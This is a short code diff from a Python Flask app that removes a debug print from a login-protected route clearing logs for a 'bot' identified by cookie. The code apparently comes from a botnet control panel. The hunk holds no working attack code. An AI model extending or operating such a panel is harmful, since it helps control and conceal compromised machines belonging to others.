@@ -103,7 +103,6 @@ def kill_proc():
 @login_required
 def clearLog():
     if 'bot' in request.cookies:
-        print("clearing")
         botnet.clearLog(request.cookies.get('bot'))
         return json.dumps({"success": True})
     return json.dumps({"success": False})
